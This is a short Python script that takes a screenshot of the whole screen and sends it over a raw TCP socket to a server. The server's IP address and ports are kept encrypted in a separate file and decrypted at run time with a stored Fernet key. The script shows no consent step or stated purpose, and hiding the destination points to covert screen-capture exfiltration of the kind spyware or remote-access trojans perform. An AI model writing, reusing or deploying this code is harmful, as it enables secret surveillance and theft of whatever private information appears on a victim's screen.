import socket
import pyautogui
import io
from cryptography.fernet import Fernet

class image_sender:

    def load_key(self):
        file = open("key.key", "rb")
        key = file.read()
        file.close()
        return key

    def decrypt_server_details(self, encrypted_details):
        key = self.load_key()
        cipher = Fernet(key)
        decrypted_details = cipher.decrypt(encrypted_details).decode()
        return decrypted_details
    
    def get_server(self):
        with open("server.txt", "rb") as server_file:
            encrypted_data = server_file.read()

            decrypted_data = self.decrypt_server_details(encrypted_data)
            for line in decrypted_data.splitlines():
                data = line.rstrip()
                self.ip, self.port, self.image_port = data.split("|")
                self.port = int(self.port) # ensure the ports are of type int
                self.image_port = int(self.image_port)

    def send_screenshot(self):
        self.get_server()
        host = self.ip
        port = self.image_port
        screenshot = pyautogui.screenshot()

        # Convert the screenshot to bytes
        screenshot_bytes = io.BytesIO()
        screenshot.save(screenshot_bytes, format="PNG")
        screenshot_data = screenshot_bytes.getvalue()

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
            client_socket.connect((host, port))
            client_socket.sendall(screenshot_data)

        print("Sent")

if __name__ == "__main__":
    app = image_sender()
    app.send_screenshot()